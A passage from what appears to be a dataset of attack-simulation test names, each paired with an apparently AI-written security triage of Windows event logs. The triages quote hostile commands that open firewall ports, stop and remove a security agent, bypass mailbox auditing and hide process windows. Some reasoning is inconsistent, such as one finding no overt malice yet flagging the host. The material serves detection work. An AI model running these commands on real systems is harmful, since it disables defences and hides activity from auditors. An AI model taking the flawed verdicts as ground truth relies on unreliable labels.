This assessment is based on the clear signature of potentially malicious behavior associated with PowerShell activity in these logs."
InstallUtil Install method call,"Upon analyzing the provided logs, there are several elements worth noticing that could indicate suspicious behavior or potential compromise:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script (`InstallUtilTestHarness.ps1`) located under a temporary user directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1`. This script is involved in importing a test harness function.
   - The script involves a PowerShell command `Invoke-BuildAndInvokeInstallUtilAssembly` that uses InstallUtil, a legitimate tool often exploited by attackers for living-off-the-land techniques.
   - The use of temporary directories and tools like InstallUtil can potentially indicate an attempt to evade detection.

2. **Sysmon Logs:**
   - There are numerous entries related to `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\\admin_test`. The frequent invocation of `wevtutil.exe`, a command-line utility for managing Windows event logs, can be indicative of attempts to clear logs or audit records, a common tactic by attackers post-exploitation.
   - The presence of processes like `csc.exe`, `cvtres.exe`, and `InstallUtil.exe` suggests compilation and potential installation activities, consistent with software development activities. However, their execution in conjunction with the PowerShell scripts may raise concerns about malicious use.
   - The consistent reference to `MicrosoftEdgeUpdate.exe` and associated subprocesses (`MicrosoftEdgeUpdateComRegisterShell64.exe`) are commonly associated with legitimate software update processes but could also be used for persistence or command execution in a malicious context.

3. **Indicators of Anomalous Patterns:**
   - The logs display a pattern of potentially automated or scripted actions combining PowerShell with other utilities which could be legitimate test operations or, if not recognized or expected, could be indicative of a more suspicious scenario.

**Assessment:**

The occurrence of invoking PowerShell with InstallUtil, especially from a user's temporary folder, the simultaneous activity of `MicrosoftEdgeUpdate` processes, and the frequent execution of `wevtutil.exe`, are somewhat concerning and warrant further investigation to rule out malicious intentions.

While these actions could be part of testing or development activities, if such activities are not normally carried out in this environment or by this user, it could potentially indicate unauthorized or malicious activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Verify the legitimacy of the script (`InstallUtilTestHarness.ps1`) and its intended use.
- Check if `admin_test` user and the activities carried out are known and authorized.
- Examine if the execution of `wevtutil.exe` aligns with any known administrative functions or scripts.
- Investigate the broader context of these events in relation to any other security alerts or incidents.
- Consider restricting PowerShell and InstallUtil usage to prevent potential abuse if not required for standard operations.

The situation warrants a thorough investigation to ensure these actions are not indicative of a security breach."
Scarab Ransomware Defense Evasion Activities,"The analysis of the provided Windows event logs yields the following observations:

1. **Time Manipulation**: 
   - The logs show events where there is a backward adjustment of the system time. This is shown by Event ID 4616 in the Security logs, where the time was set from ""2024-10-24 17:51:01.3261143"" to ""2024-10-24 17:50:58.4711744"" and then adjusted again to ""2024-10-24 17:50:58.4729956"". This time manipulation is suspicious, as attackers often alter system clocks to evade detection of malicious activities.

2. **Use of Powerful Privileges**:
   - The `admin_test` account is involved in multiple processes with high privileges. These processes include `C:\Windows\System32\cmd.exe`, which was executed with a command involving registry changes (`reg add ...`). This action is indicative of a potential persistence mechanism being implemented or modified, especially modifying CredSSP settings which are related to authentication.
   - The event ID 4672 also indicates that user `admin_test` was granted a set of powerful privileges that are often associated with maintaining persistence and conducting further malicious activities (SeDebugPrivilege, SeBackupPrivilege, etc.).

3. **Unusual Process Executions**:
   - There are multiple instances of `wevtutil.exe` executed by `admin_test`. This could indicate an attempt to query or manage event logs, which can be part of efforts to cover tracks.
   - The appearance of command-line utilities such as `hostname.exe` and `whoami.exe` can be indicative of reconnaissance activity. While not inherently malicious, the context of these combined actions, considering the elevated privileges and registry modifications, warrants further investigation.

4. **Normal System and Application Behavior**:
   - The entries related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) seem to follow a typical update pattern with no immediate signs of malicious intent. They show the update process and associated activities.

Based on the analysis, there are several indicators of potentially malicious activity, notably the time manipulation, the high privilege operations performed by `admin_test`, and the registry modifications. These actions are typically associated with malicious intentions or security policy breaches.

**Assessment of the Situation**: 
- The activities observed in the logs are suspicious. They suggest that further investigation is necessary to confirm whether the actions are authorized and to ensure that they are not part of a larger malicious campaign.

**Recommended Resolution**: 
- **SUSPICIOUS** - The logs contain activities that do not look typical for a standard operation and definitely warrant a deeper investigation. Immediate verification of the `admin_test` user actions, the legitimacy of time changes, and registry modifications should be prioritized. Additionally, checking for any unauthorized batch or script files, and performing host-based behavioral analysis can help more accurately determine the root cause of these actions."
Opening ports for proxy - HARDRAIN,"After analyzing the provided log entries, I have identified several areas worth discussing regarding potential malicious activity:

1. **Repeated `wevtutil.exe` and `conhost.exe` Executions:**
   - The repeated execution of `wevtutil.exe` interposed with `conhost.exe` under the user `SERVER002\\admin_test` in quick succession is worth considering. `wevtutil.exe` is used to manage the event logs, and its high frequency execution might suggest tampering with event logs, which can be a tactic used by malicious actors to cover their tracks.
   
2. **Unusual Command Line Activity:**
   - Execution of `cmd.exe` with the command line `""cmd.exe"" /c netsh advfirewall firewall add rule name=""file testing"" action=allow dir=in protocol=TCP localport=450` indicates firewall modifications. Unauthorized changes to firewall rules could indicate network traffic manipulation, which requires further examination to confirm intent.

3. **Creation of Network Traffic Rule:**
   - The use of `netsh.exe` to add a firewall rule could be legitimate; however, without proper documentation or a known change request, this could be an indicator of someone attempting to ensure persistent or covert network access, which is commonly associated with intrusions.

4. **Legitimate Processes in Use:**
   - Processes like `whoami.exe`, `svchost.exe`, and other system processes such as `TiWorker.exe`, `TrustedInstaller.exe` are common and typically do not stand out unless associated with unusual behavior or modification to their typical operations. In this context, their appearance does not immediately suggest malicious activity.

5. **Time Synchronization Events:**
   - The logs also include time change events, typically routine. If unscheduled, this might deserve scrutiny to ensure no malicious intentions are involved, but on its own, this is not necessarily suspicious.

**Assessment and Guidance:**

The activities found in the logs show signs that could potentially be linked to suspicious behavior. However, from these logs alone, we can't definitively confirm that malicious activity is occurring. The observed behaviors—modifying firewall rules and frequent, automated execution of certain administrative processes—can sometimes occur in normal environments for maintenance or configuration tweaking, but without clear documentation or benign context, they can be considered suspicious.

**Resolution:**

**SUSPICIOUS** - The logs include activities that are unusual and warrant further investigation to determine the intent behind the firewall rule addition, excessive use of `wevtutil` and `conhost`, and any unauthorized use of these processes. It is recommended to:
- Verify if the firewall rule change and frequent command execution were authorized.
- Check for any anomalies in network traffic on port 450.
- Monitor and verify other activities by the user `SERVER002\\admin_test.`

Further action should include reaching out to system administrators or reviewing change request logs to match activities to legitimate workflows or identifying any signs of potential compromise."
ProtocolHandler.exe Downloaded a Suspicious File,"Let's analyze the provided logs for any indications of malicious activity:

### Summary of Log Findings

#### Application Log
1. **Edge Update Service Stopped**: The events indicate that the Microsoft Edge Update service was stopped twice. This alone is not suspicious as services may stop for updates or maintenance.

2. **Software Protection Platform Service (SPP)**: Logs from the Software Protection Platform are typically benign, often related to license validation and rules engine operation.

#### Sysmon Log
1. **Microsoft Edge Update Executions**:
   - There are numerous events related to the execution of `MicrosoftEdgeUpdate.exe`. This is a component of Edge tasked with updating, and the actions appear to align with typical update behaviors.
   - Additional processes like `MicrosoftEdgeUpdateComRegisterShell64.exe` are involved, suggesting registration activities typical of updates.

2. **Command Execution**:
   - **Suspicious cmd.exe Command**: The command `""cmd.exe"" /c FOR /F ""tokens=2*""` followed by registry querying and calling `protocolhandler.exe` to open a document from a web location is a potential concern. Such operations may hint at an attempt to download and execute something remotely, potentially malicious if unexpected.

3. **PowerShell Execution**: While there were PowerShell executions, no direct command line arguments were captured, leaving potential ambiguity about the tasks performed.

4. **System Processes**:
   - System processes like `TrustedInstaller.exe` and `TiWorker.exe` are related to Windows Update mechanisms, which do not immediately suggest compromise.

#### Observations
- Most logs revolve around legitimate Microsoft processes, primarily related to Edge updates.
- The command execution using `cmd.exe` is noteworthy due to its complexity and potential to execute scripts or download content from the internet, raising a red flag.
- There are several processes executed by the user ""SERVER002\\admin_test"" using elevated privileges (NT AUTHORITY\SYSTEM), which might be typical in administrative or development scenarios but warrants verification against expected behavior for that user.

### Assessment
The logs suggest typical system behavior centered around the Microsoft Edge Update process. However, the presence of a potentially suspicious command execution that interacts with system registries and online content requires further scrutiny. This indicates a possible deviation from normal activities, particularly if such behavior wasn't expected or scheduled.

### Conclusion
Resolution: **SUSPICIOUS**

The logs predominantly reflect benign activities associated with legitimate updates. However, the complex command execution warrants further investigation to determine its legitimacy. Cross-referencing this activity against recent changes, updates, or administrative tasks will be crucial.

### Recommendations
1. **Verify the Command**: Discuss with the user ""admin_test"" or check system policies for any legitimate reasons for the command execution. Confirm whether recent tasks involved scripted commands or automation.

2. **Network Activity**: Review network logs for the host around the relevant timeframe for any outbound connections to unusual or unauthorized URLs.

3. **Endpoint Monitoring**: Implement tighter endpoint monitoring to alert on similar suspicious command-line patterns or network activities in the future.

4. **System Integrity Check**: Conduct comprehensive malware scans on Server002 to ensure no lingering threats exist, especially if the command proves unauthorized."
Bypass UAC using sdclt DelegateExecute,"In the collection of event logs provided, I will analyze each of the types (Security, Application, Windows PowerShell, System, and Sysmon) to identify any potential indicators of malicious activity.

### Security Log Analysis
1. **Event ID 4624**: A successful logon event is recorded. The logon type 5 indicates a service startup, which typically uses SYSTEM privileges. This is a normal event when service accounts log on.
2. **Event ID 4672**: Special privileges are assigned to the SYSTEM account. The privileges listed are typical for system-related activities and do not inherently indicate malicious behavior.
3. **Event ID 4616**: These logs show changes to the system time by the LOCAL SERVICE account, facilitated by the svchost.exe process. This activity is not uncommon and could be related to time synchronization settings.

### Application Log Analysis
The Application logs show several updates on Windows Defender's operational status (SECURITY_PRODUCT_STATE_ON), which is normal. The Security-SPP and Microsoft Edge update events also appear regular without any altering configurations or errors that might raise alarms.

### Windows PowerShell Log Analysis
The PowerShell logs are concerning due to the execution of scripts modifying registry paths and running processes:
- Commands executed indicate an attempt to create a registry key under HKCU that launches cmd.exe to open notepad.exe, typically a technique known as ""living off the land"" (LotL) where native binaries or scripting are leveraged for potentially malicious purposes.
- The use of `Start-Process` with `sdclt.exe` can indicate an attempt to exploit known vulnerabilities (e.g., DLL hijacking via sdclt.exe).
- These PowerShell activities warrant investigation as they align with known tactics used in attacks such as privilege escalation or persistence.

### System Log Analysis
The System logs primarily deal with Kernel-General events and time services which synchronize the system clock. No direct malicious indicators, but changes in system time could overlap with activities aiming to circumvent logs or time-based security checks.

### Sysmon Log Analysis
Sysmon logs show multiple process creations and file paths related to Windows system processes:
- There are entries showing PowerShell being initiated with commands in line with those seen in the PowerShell logs. This verifies those PowerShell commands were indeed executed.
- The presence of wevtutil.exe and conhost.exe processes multiple times in quick succession might indicate attempts to interact with Windows event logs or command shell operations, possibly for logging tampering or administrative activities.

### Recommendation

Given the PowerShell command activity altering registry entries and executing scripts that might be leveraged for persistence or privilege escalation, I categorize this activity as:

- **Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Investigate the ""admin_test"" user account, as this account is repeatedly tied to the suspicious activity.
- Conduct a review of the registry changes, particularly under `HKCU:\Software\Classes\Folder\shell\open\command`.
- Assess sdclt.exe usage logs for anomalous activities.
- Check for additional indicators of compromise (IoCs) such as unexpected Windows event log tampering or User Account Control (UAC) settings modifications.
- Monitor for further suspicious activities involving PowerShell or native Windows executables (LotL tactics).
- Consider isolating the system if suspicions are confirmed to prevent potential spread and further compromise."
MSXSL Bypass using local files,"### Analysis of Windows Event Logs

#### Overview
Upon analyzing the logs provided, I have noticed several events related to process creation, system logons, and privileged operations. These could indicate normal operating system activities if they correspond with known patterns. However, in some contexts, they might suggest suspicious or malicious activities, especially if they appear anomalous or uncontrolled.

#### Detailed Findings

1. **Security Log Analysis**:
   - Events 4624 and 4672: These logs represent a successful logon and the assignment of special privileges to the account identified as SYSTEM and SERVER002$. These events occurred with LogonType 5, which signifies a service logon. The privileges listed (e.g., SeDebugPrivilege) are typical for SYSTEM accounts, but extensive use of such privileges could warrant further inspection to ensure no misuse.
   - Multiple EventID 5379: These logs indicate failed authentication attempts related to Microsoft accounts. The error code `3221226021` hints at authentication failures. Repeated attempts could be a concern if not accounted for by routine operations or known good behaviors.

2. **Sysmon Log Analysis**:
   - Multiple processes created by the user `SERVER002\admin_test` include `powershell.exe`, `conhost.exe`, and `wevtutil.exe` among others. Powershell usage in particular should be scrutinized for signs of scripting or other automation without an expected basis.
   - Event 18045: A `cmd.exe` process was launched with a command invoking an executable `msxsl.exe` with specified XML and XSL files. This could indicate a potential malicious operation or a scheduled task performing file transformations. The command context is crucial to determine its legitimacy.
   - Event ID 1 and subsequent: The sequence of conhost and CompatTelRunner executions is consistent with certain updating or compatibility checking processes but requires validation against expected behavior.

3. **Application Log Analysis**:
   - Event IDs 2389 and 2390 indicate that Windows Defender was active and running. This suggests no immediate signs of tampering with the system's protection software.

4. **Overall System Behavior**:
   - The presence of typical Windows update processes (e.g., CompatTelRunner) and system service hosts operating in expected directories points to generally benign system operations. However, the breadth of privilege use and command-line executions identified deserves a cautious approach, further verifying against an internal whitelist or known operations.

### Assessment

**Conclusion**: After considering the details of the logs, there are no overt signs of malicious activity. The activities largely align with regular Windows behavior, possibly with some atypical entries such as repeated failed login attempts which could relate to misconfiguration or attempted unauthorized access.

#### Resolution
- **Resolution**: **SUSPICIOUS**
- **Guidance**: Conduct another review focusing on anomalous behavior and ensuring all activities match known good practices or register within acceptable alert thresholds in your specific organizational context. It's essential to further audit any discrepancies, notably the PowerShell executions and failed logon attempts for assurance of security measures.
- Consider logging enhancements or more sophisticated anomaly detection to automate flagging and response to potential threats in similar future instances."
CMSTP Executing UAC Bypass,"Upon analyzing the provided Windows event logs, the following observations and assessments are made:

### Suspicious Activity:
1. **Process Execution by ""admin_test"" User:**
   - PowerShell, `wevtutil.exe`, `conhost.exe`, and `cmstp.exe` processes were executed by the user ""SERVER002\\admin_test"" within a very short time frame. The presence of `cmstp.exe` executing with the `/au` flag in the `data.003_uacbypass.inf` file is particularly suspicious. The `/au` flag in `cmstp.exe` can potentially be used in a User Account Control (UAC) bypass technique. 
   - Additionally, `whoami.exe` and `cmd.exe` also appear to be executed by this user. The combination of these processes and their command-line arguments suggest an attempt to elevate privileges or execute scripts without user consent or awareness.

2. **Indirect Execution of Edge Update Setup:**
   - The logs show multiple executions of Microsoft Edge Update and associated setup files. While software updates can occur frequently, the specific temporary paths and frequency of these setup executions, coupled with the extensive verbosely logged setup installations might suggest an anomalous or possibly scripted activity that requires further investigation.

3. **Elevated Privileges:**
   - Event IDs 4672 reveal privilege assignments to the ""admin_test"" user, which includes various high-level privileges such as `SeDebugPrivilege`. This may indicate either intentional administrative tasks or potential misuse if these assignments weren't part of regular user behavior.

### Assessment:
- The sequence of process executions involving administrative tools (i.e., `cmstp.exe`, `PowerShell`, `conhost.exe`) and elevated privileges, particularly involving the ""admin_test"" user, align with the known patterns utilized in UAC bypass or lateral movement techniques. 
- Given the use of command-line arguments to potentially bypass security features, the behavior is definitely suspicious. Furthermore, the pattern of invoking temporary executables related to Microsoft Edge in rapid succession is abnormal for a system without specific user-triggered update demands.

### Conclusion and Resolution:
- **Resolution: SUSPICIOUS**

The logs depict behavior that warrants further investigation to rule out potential malicious activity. It is crucial to conduct additional assessments, such as:
- Reviewing user actions and authentication events related to ""admin_test"".
- Examining the source and intent behind the `cmstp.exe` usage with `/au` flag and the `data.003_uacbypass.inf` file.
- Investigating the origin and necessity of rapidly executed Microsoft Edge setup processes beyond typical update behavior.

**Guidance on How to Proceed:**
1. **Isolate the host** to ensure it is not part of any active breach.
2. **Perform forensic analysis**, focusing on file system changes, registry modifications, and possible network communication from the suspect processes.
3. **Check for any unauthorized changes** in the user permission or group memberships.
4. **Audit admin actions and logs** to verify if privileged accounts were compromised.
5. **Consider engaging incident response** teams if additional evidence of compromise is detected during deeper analysis.

This assessment concludes that there is a compelling need for deeper forensic investigation and validation of the aforementioned user actions to fully understand the scope and impact of the detected events."
Remove Network Share PowerShell,"Upon reviewing the provided Windows event logs, the following observations can be made:

### System Log Analysis
- The system logs show events related to time changes managed by ""svchost.exe"" processes. Time changes on a system can be normal, often due to synchronization tasks with time servers. 
- The ""Microsoft-Windows-Time-Service"" event suggests that the time service is synchronizing with ""time.windows.com"", which is a regular public time source maintained by Microsoft.

### Application Log Analysis
- The application log entries are tied to ""edgeupdate"", indicating routine service stops possibly related to updates of Microsoft Edge. This activity is expected behavior for scheduled or automatic updates.

### Sysmon Log Analysis
- Multiple mentions of ""wevtutil.exe"", ""conhost.exe"", ""HOSTNAME.EXE"", ""whoami.exe"", and ""powershell.exe"" are seen executing operations with high integrity levels. While these executables may have legitimate uses, they can also be leveraged for malicious activities such as information gathering or configuration changes.
- The logs contain an instance of ""powershell.exe"" executing a command to remove SMB shares. This could be indicative of malicious behavior if it was not authorized or expected in normal operations, as it might be an attempt to disrupt services or network shares.
- Observed Microsoft Edge Update processes, including setups and temporary files within ""Microsoft\\Temp\\"", suggest typical behavior associated with software update procedures for Microsoft Edge.

### Windows PowerShell Log Analysis
- There is evidence of PowerShell being used to run a command modifying SMB shares. This action aligns with the Sysmon logs showing PowerShell execution to run ""Remove-SmbShare"" and ""Remove-FileShare"". If this was unauthorized, it represents a potential risk.

### Security Log Analysis
- Entries related to security auditing show the same time changes logged in the system logs. The svchost.exe is linked to these changes, consistent with expected operations influencing system time.

### Assessment and Recommendation
The logs predominantly show normal activities such as time synchronization and application updates. However, the use of PowerShell to remove SMB shares raises a red flag regarding potential malicious activity. If the PowerShell command to remove SMB shares was not sanctioned or expected as part of routine maintenance, it might indicate an attempt at privilege escalation, denial of service, or lateral movement within the network.

Thus, the activity within the logs could not be immediately corroborated as benign or directly malicious without further context. The suspicious nature of the PowerShell activity warrants further investigation to verify if it corresponds with authorized administrative actions or scheduled maintenance.

### Resolution
- **SUSPICIOUS**: The logs contain a PowerShell event commanding the removal of SMB shares, which is abnormal if not expected as part of standard operations. This requires further investigation to determine the legitimacy of these actions and to rule out malicious intent."
Stop and Remove Arbitrary Security Windows Service,"Upon reviewing the provided logs, several points of interest have been identified that suggest potential malicious activity:

1. **Windows PowerShell Activity**:
   - In the Sysmon logs and Windows PowerShell logs, there is an instance where PowerShell is executing a command to stop and remove a service: `""powershell.exe"" & {Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService}`.
   - This command is used to disable and remove a service related to McAfee DLP (Data Loss Prevention) Agent, which is a security product.
   - The execution of this command suggests an attempt to disable security mechanisms on the system, which is a common tactic used by threat actors to facilitate unauthorized access or data exfiltration without being detected.

2. **Event Log Activity**:
   - The Sysmon logs show multiple instances of `wevtutil.exe` being spawned by the user `SERVER002\admin_test`. `wevtutil.exe` is a command-line utility used to manage event logs, and its usage can sometimes be indicative of an attacker clearing event logs to cover their tracks.

3. **Privileged Access Indicators**:
   - There are several instances of processes being executed with system-level privileges (e.g., `NT AUTHORITY\SYSTEM`), which is expected on a server but should still be reviewed to ensure they are part of legitimate operations.

Considering the findings above, especially the disabling of a security service, there is substantial evidence pointing to potentially malicious activity. The action to stop and remove an antivirus-related service is particularly concerning as it may indicate an attempt to weaken the host's defenses.

Resolution: **MALICIOUS**

**Guidance on How to Proceed**:
- Initiate a containment procedure to isolate the affected host from the network to prevent any further potential malicious activity.
- Conduct a forensic analysis on the affected host to confirm the compromise and assess the scope and intent of the activities.
- Review and potentially restore any disabled or modified security configurations, especially those affecting antivirus or DLP solutions.
- Consider performing a full system restore or reimaging the host depending on the findings from the forensic analysis.
- Monitor other systems in the environment for similar activities and enhance logging and monitoring to detect any further attempts.
"
Activate Windows NoSetTaskbar Group Policy Feature,"### Analysis of the Logs

After reviewing the provided Windows event logs, here's a detailed analysis focusing on the categories mentioned:

#### Security Log Analysis
- **Event ID 4616**: Represents a system time change. There are two entries indicating a time change initiated by `C:\Windows\System32\svchost.exe` for the `LOCAL SERVICE` account. Time changes, especially if not expected, can be an indication of tampering. However, without additional context of repeated or large time changes, these isolated events appear standard, often associated with synchronization tasks.

#### Application Log Analysis
- **Microsoft-Windows-Security-SPP, edgeupdate Events**:
  - These logs indicate standard operations of the software protection platform and Edge Update services. Edge Update stopped and restarted, which is routine during updates.

#### Sysmon Log Analysis
- **Event ID 5 and 1**: 
  - Multiple `Image` executions like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`. 
  - The command `cmd.exe /c reg add [...]` executed with high integrity level is particularly concerning since it modifies the registry without explicit administrative intervention, indicating possible persistent mechanism deployment.
  - The execution of benign tools like `whoami.exe`, `hostname.exe`, and continuous `conhost.exe` instances, suggests possible obfuscation or system enumeration activities associated with malicious actors.

#### System Log Analysis
- **Event ID 24 & 1(Kernel-General), Event ID 35(Time-Service)**: 
  - These cover time changes as detailed above. Appearances here supplement the Security log and do not indicate broader inconsistency but show regular synchronization.

### Threat and Risk Assessment
- **Suspicious Activity**: Registry modification via `cmd.exe` is a red flag and is the primary concern indicating potential persistence or a precursor to privilege escalation or controlled behavior by a user account (`SERVER002\\admin_test`).
- **Usage of Built-in Tools**: Execution of tools such as `wevtutil.exe`, `whoami.exe`, and `conhost.exe` by the `admin_test` user shows potential activity profiling.
- **Edge Updates**: Typically routine, no irregularities observed in these logs concerning the Edge update activities.

### Guidance and Conclusion
Considering the evidence, there's reasonable suspicion that further analysis is necessary to determine the scope of potential malicious activity:

- **Resolution**: **SUSPICIOUS** - The command-line arguments with registry modifications, especially without further corroborating justification, necessitate additional scrutiny. While the Edge Update process shows typical activity, the other logged events warrant deeper investigation.
- **Next Steps**:
  1. Review any accompanying logs related to command execution by the `admin_test` account.
  2. Assess the system for unauthorized scheduled tasks, startups, or installed software.
  3. Perform a host-based comprehensive scan for anomalies, especially targeting persistence mechanisms.
  4. Validate time synchronization settings and ensure external tamper is ruled out.
  5. Engage SIEM tools to check for repeated occurrences or deviations in admin behavior patterns.

Thus, the investigation should continue to focus on verifying the integrity of the system and ensuring no ongoing compromise is present."
Indicator Manipulation using FSUtil,"Based on the analysis of the provided Windows event logs, several activities suggest suspicious behavior that warrants further investigation:

1. **Time Change Events**:
   - There are repeated `TimeChange` events (EventID: 4616 and 1 in the Security and System logs) indicating the system time was changed. This can be associated with attempts to manipulate time-stamped logs for malicious purposes.

2. **User and Privilege Elevation**:
   - User `admin_test` logged in with high-level privileges using NTLM authentication from a remote desktop (`DESKTOP-3HL5B2P`) (EventID: 4624 and 4672). The privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which could potentially be abused for sensitive activities.

3. **Suspicious Process Execution**:
   - The execution of PowerShell commands, including `New-Item` and `fsutil` to create and manipulate files in a temp directory, could be a sign of malicious scripting activity aimed at circumventing standard logging by buffering or modifying logs.
   - The PowerShell script is doing manipulations like creating a file and overwriting its data, which could be indicative of data exfiltration or staging.

4. **Usage of System Utilities**:
   - Multiple instances of `wevtutil.exe` being called by `admin_test` are seen in the Sysmon logs. `wevtutil.exe` is a command-line utility used to retrieve information about event logs. Malicious actors often use it to clear or export event logs to cover tracks.

5. **EdgeUpdate Process Anomalies**:
   - There are multiple EdgeUpdate processes (not necessarily normal), which could suggest software updates, but in conjunction with the other activities, could also imply masking behavior.

**Assessment and Resolution**:
- The combination of time changes, high-privileged user logins, utilization of native utilities like PowerShell and `wevtutil.exe`, and command-line executions indicate activity that is suspicious and aligns with common post-exploitation behaviors seen in attacks.
  
**Resolution**: SUSPICIOUS

**Guidance**:
1. **Immediate Actions**:
   - Conduct deeper analysis into the context of PowerShell commands.
   - Check if `admin_test` is a legitimate user and verify the necessity and legitimacy of the privileges.
   - Correlate these logs with network logs to identify potential outbound connections made by PowerShell scripts.
   
2. **Long-Term Actions**:
   - Set up alerting for the use of sensitive privileges and utilities like `wevtutil.exe`.
   - Enhance monitoring for suspicious patterns involving time changes and high-privileged account activities.
   - Educate users on best practices and periodically review accounts and privileges for least-privilege alignment.

This approach should focus on verifying whether legitimate administrative activities were performed without malicious intent or identifying an actual compromise involving these activities."
Msiexec.exe - Execute Remote MSI file,"Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified. Here's a detailed analysis of the significant events and my conclusions.

### Analysis:

1. **Sysmon Events:**
   - Multiple executions of `wevtutil.exe` (Event IDs 17956, 17960, 17964, 17968, 17972) and `conhost.exe` by `admin_test` are observed. While these processes are native to Windows and may be legitimate, `wevtutil` can be used to query or clear event logs, which is suspicious when done repeatedly and especially in quick succession.
   - The execution of `cmd.exe` with the command line including `msiexec.exe` to install a remote MSI package from GitHub (`data.007_JScript.msi`) is suspicious (Event ID 17983). This indicates the possible execution of remote, potentially malicious code.
   - PowerShell execution with the `-nop` (No Profile) flag observed in Event ID 17987 is a classic indicator of an attempt to bypass security features and execute a script, which is suspicious. The command is `Write-Host JScript executed me!; exit`, suggesting possible remote script execution triggered by the MSI package.
   
2. **Application Logs:**
   - The MSI installation Event ID 2385 confirms the download and installation of `data.007_JScript.msi`, further substantiating suspicious activity.
   - Follow-up MSI installation logs (Event IDs 2387 and 2389) confirm the installation was completed, which coincides with the PowerShell script execution.

3. **PowerShell Logs:**
   - PowerShell log Event IDs 1043 to 1050 show the No Profile flag (`-nop`) was used, executing a command, which indicates potentially scripted activity from the installed MSI package. This execution without a user profile is common in malicious scenarios to avoid detection.

### Conclusion:

The logs suggest attempts to execute remote code through MSI, as indicated by the execution of `cmd.exe` and `msiexec.exe` without prior notification to the user, alongside PowerShell executions that are atypical for routine operations. The sequence suggests that scripts were executed, possibly as part of the package `data.007_JScript.msi`, which appears suspicious and unauthorized.

### Resolution:

**MALICIOUS** - The presence of remote MSI installation without explicit authorization, associated with PowerShell execution bypassing security protocols, strongly indicates that potentially malicious activity has occurred on this host.

### Recommendations:
- Immediate isolation of the affected host (`Server002`) to prevent lateral movement within the network.
- A comprehensive review and analysis of installed software and downloaded files to verify any changes or unauthorized installations.
- Performing a full malware scan and forensic analysis to determine the extent of compromise.
- Reviewing system access controls and ensuring strict limitations on downloading and executing remote scripts or MSI packages.
- Advising the security team to monitor network traffic for similar activities in real-time for early detection of potential threats."
Hidden Window,"**Detailed Analysis:**

1. **Security Log:**
   - The events are all related to time changes, specifically Event ID 4616, which indicates a change in system time. The process involved is `C:\\Windows\\System32\\svchost.exe` running as `LOCAL SERVICE`. Frequent or unauthorized system time changes might indicate an attempt by malware to cover its tracks by manipulating timestamps. However, in this context, there is not enough evidence to suggest this is the case, as no direct causes or anomalies in surrounding logs that auto-correlate suggest malicious intent directly.

2. **Windows PowerShell Log:**
   - The PowerShell log entries show the `powershell.exe` executed with `Start-Process powershell.exe -WindowStyle hidden calc.exe`. This could indicate potentially suspicious behavior as it involves hiding the execution window and launching another instance of PowerShell to execute `calc.exe`. The use of `-WindowStyle hidden` is often associated with stealthier operations.
   - This execution pattern, without further context, could involve benign administrative scripts, but could also imply a technique where malware uses PowerShell to execute arbitrary commands under a hidden window, suggesting potentially suspicious activity.

3. **Sysmon Log:**
   - Sysmon logs indicate an instance of PowerShell executing with the command `calc.exe` again, aligning with the PowerShell logs.
   - Another notable pattern is the repeated execution of system binaries such as `conhost.exe`, `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by the user `SERVER002\\admin_test`. While `whoami.exe` and `hostname.exe` are benign utilities, frequent and unusual invocation might point to debugging or reconnaissance activity.
   - Event ID 1 for `powershell.exe` involving the command to start hidden processes could point to scripting activities. However, without malicious payload execution, these might only be suspicious.

4. **System Log:**
   - The logs mostly show benign system activity such as time synchronization that corresponds to the system's natural state adjustments.

5. **Application Log:**
   - The `Software Protection Platform Service` log entry appears routine and shows timestamp synchronization which is a standard activity.

**Assessment:**

- **Suspicious PowerShell usage:** The pattern of PowerShell execution with hidden windows stands out as suspicious. While `calc.exe` is not malicious, the manner of its execution is odd in typical environments. It suggests possibly testing or scripting activities which may warrant further understanding of user intentions.

- **Frequent use of `conhost.exe` and system utilities:** While these are necessary components of the OS, their frequent execution in such a manner might warrant further analysis, especially if it aligns with behaviors seen during lateral movement or privilege escalation.

**Resolution:**

- **SUSPICIOUS**

**Guidance:**

- Further examine user `SERVER002\\admin_test` to understand their role and typical activity. Confirm if these actions align with their responsibilities and whether they are testing or scripting.
- Conduct a review of the system environment regarding any known incidents or recent updates that might explain changes.
- Consider implementing stricter PowerShell usage policies, and ensure that all administrative actions are logged and reviewed for any hidden execution that might indicate similar activities.
- Monitor traffic from the system for any outbound anomalies that could hint at data exfiltration attempts."
Office 365 - Set Audit Bypass For a Mailbox,"Upon reviewing the logs provided, the following observations stand out:

1. **PowerShell Execution**:
   - There is a PowerShell activity that stands out in the Sysmon logs, specifically the command involving `Connect-ExchangeOnline -Credential $creds, Set-MailboxAuditBypassAssociation`. This command is used to connect to Exchange Online using credentials and modify the audit bypass settings for a mailbox. The `Set-MailboxAuditBypassAssociation -AuditBypassEnabled $true` part is concerning as it can be used to prevent certain actions on the mailbox from being audited.
   - The command used `ConvertTo-SecureString -AsPlainText -Force`, which indicates plaintext password usage, a potential security risk.
   
2. **High-Integrity Level and SYSTEM Integrity Level**:
   - All processes executed by the user `SERVER002\\admin_test` and `NT AUTHORITY\\SYSTEM` operated with high or system integrity levels.
   - Execution by `SERVER002\\admin_test` appears legitimate for administrative tasks and usage through `NT AUTHORITY\\SYSTEM` can be expected for system-level operations.

3. **Sysmon Events and Correlated Behavior**:
   - Numerous instances of process creations around `conhost.exe`, `wevtutil.exe`, and `PowerShell.exe`.
   - The legitimate use of these utilities like `wevtutil.exe` (which can be used to clear the event logs) can also raise an alert when seen in conjunction with potentially malicious commands.

4. **Security and System Logs**:
   - The security logs provided contain no entries, which could be a result of clearing logs or a configuration issue. This is suspicious as it indicates potential tampering.
   - System logs primarily show normal activities related to Windows Updates and kernel activities, indicating normal system updates and operations.

### Assessment:

1. **Suspicious Activity**:
   - The use of PowerShell to connect to Exchange Online with the mentioned command (`Set-MailboxAuditBypassAssociation`) from `admin_test` user credentials indicates deliberate action to enable settings that are usually manipulated for stealth or bypass purposes.

2. **Lack of Security Logs**:
